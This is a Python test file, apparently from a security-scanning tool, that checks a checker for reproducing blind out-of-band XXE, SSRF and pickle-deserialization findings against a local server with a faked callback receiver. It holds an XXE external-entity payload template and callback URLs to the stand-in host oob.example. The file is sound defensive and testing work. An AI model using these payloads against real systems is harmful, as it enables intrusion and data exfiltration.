"""SGK-2026-0494: OOB(帯域外)ブラインドの封印再現（新 token を発行→payload に埋めて再送→
標的が受信器へその新 token でコールバック→matched）を検証する。標的送信はローカル HTTP
サーバで受け、OOB 受信は注入 FakeOOBProvider で模擬。製品非依存・実ネット依存なし。"""

import http.server
import threading

from src.core.models.finding import Evidence, Finding, Severity, VulnType
from src.core.security.ethics_guard import ScopeDefinition
from src.core.validation.sealed_reproduction_checker import SealedReproductionChecker


class _TargetHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        if length:
            self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"")

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"")

    def log_message(self, *a):
        pass


def _start_target():
    srv = http.server.HTTPServer(("127.0.0.1", 0), _TargetHandler)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{port}/home"


class _FakeOOBProvider:
    channel = "http"

    def __init__(self, will_callback=True):
        self.will_callback = will_callback
        self._n = 0

    async def start(self):
        pass

    async def stop(self):
        pass

    def new_callback(self):
        self._n += 1
        token = "replaytok%d" % self._n
        return f"http://oob.example/callback/{token}", token

    async def poll(self, token, timeout=10.0):
        if not self.will_callback:
            return None
        return {"token": token, "path": f"/callback/{token}", "remote_ip": "10.0.0.9",
                "method": "GET", "headers": {}}


_SCOPE = ScopeDefinition(program_name="sealed-oob-test", in_scope_domains=["127.0.0.1"])
_TEMPLATE = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{OOB}">]><items>&x;</items>'


def _finding(url):
    return Finding(
        target_url=url,
        vuln_type=VulnType.XXE,
        severity=Severity.HIGH,
        title="Blind XXE (OOB)",
        description="oob callback",
        source_agent="SmartBlindXXEHunter",
        evidence=Evidence(
            request_method="POST", request_url=url, request_headers={},
            request_body="<seed/>", response_status=200, response_body="",
        ),
        additional_info={
            "oob_evidence": {
                "vuln_class": "xxe", "channel": "http", "token": "seedtok",
                "callback_url": "http://oob.example/callback/seedtok",
                "payload": '<!ENTITY x SYSTEM "http://oob.example/callback/seedtok">',
                "interaction_received": True,
                "interaction": {"token": "seedtok", "path": "/callback/seedtok"},
                "request_status": 200,
            },
            "oob_replay": {
                "method": "POST", "url": url, "mode": "form", "param": "xxe",
                "content_type": None, "payload_template": _TEMPLATE,
            },
            "unique_oob_callback_received": True,
            "poc_request": f"POST {url} HTTP/1.1\r\n\r\nseed",
            "poc_response": "HTTP/1.1 200\r\n\r\n(blind) GET /callback/seedtok HTTP/1.1",
        },
    )


def test_matched_when_fresh_token_called_back():
    srv, url = _start_target()
    try:
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=_SCOPE,
            oob_provider=_FakeOOBProvider(will_callback=True), timeout_seconds=5,
        )
        out = chk.check(_finding(url).to_dict())
        assert out.status == "matched"
        assert "oob_interaction_received" in out.reason
    finally:
        srv.shutdown()


def test_matched_query_mode_ssrf():
    # SSRF: callback URL を query パラメータに入れる GET 再現（SGK-2026-0495）。
    srv, url = _start_target()
    try:
        f = _finding(url).to_dict()
        f["additional_info"]["oob_replay"] = {
            "method": "GET", "url": url, "mode": "query", "param": "url",
            "content_type": None, "payload_template": "{OOB}",
        }
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=_SCOPE,
            oob_provider=_FakeOOBProvider(will_callback=True), timeout_seconds=5,
        )
        out = chk.check(f)
        assert out.status == "matched"
    finally:
        srv.shutdown()


def test_matched_builder_mode_deser():
    # デシリアライズ: builder パスで fresh callback からガジェットを作り直し再送（SGK-2026-0496）。
    srv, url = _start_target()
    try:
        f = _finding(url).to_dict()
        f["additional_info"]["oob_replay"] = {
            "method": "POST", "url": url, "mode": "form", "param": "data_obj",
            "content_type": None, "builder": "python_pickle", "encoding": "hex",
            "payload_template": "{OOB}",
        }
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=_SCOPE,
            oob_provider=_FakeOOBProvider(will_callback=True), timeout_seconds=5,
        )
        out = chk.check(f)
        assert out.status == "matched"
    finally:
        srv.shutdown()


def test_mismatched_when_no_callback():
    srv, url = _start_target()
    try:
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=_SCOPE,
            oob_provider=_FakeOOBProvider(will_callback=False), timeout_seconds=5,
        )
        out = chk.check(_finding(url).to_dict())
        assert out.status == "mismatched"
    finally:
        srv.shutdown()


def test_not_run_when_no_provider():
    srv, url = _start_target()
    try:
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=_SCOPE, oob_provider=None, timeout_seconds=5,
        )
        out = chk.check(_finding(url).to_dict())
        assert out.status == "not_run"
    finally:
        srv.shutdown()


def test_not_run_when_out_of_scope():
    srv, url = _start_target()
    try:
        other = ScopeDefinition(program_name="other", in_scope_domains=["example.org"])
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=other,
            oob_provider=_FakeOOBProvider(will_callback=True), timeout_seconds=5,
        )
        out = chk.check(_finding(url).to_dict())
        assert out.status == "not_run"
    finally:
        srv.shutdown()


def test_not_run_when_template_missing_placeholder():
    srv, url = _start_target()
    try:
        f = _finding(url).to_dict()
        f["additional_info"]["oob_replay"]["payload_template"] = "<no-placeholder/>"
        chk = SealedReproductionChecker(
            network_client=None, scope_definition=_SCOPE,
            oob_provider=_FakeOOBProvider(will_callback=True), timeout_seconds=5,
        )
        out = chk.check(f)
        assert out.status == "not_run"
    finally:
        srv.shutdown()
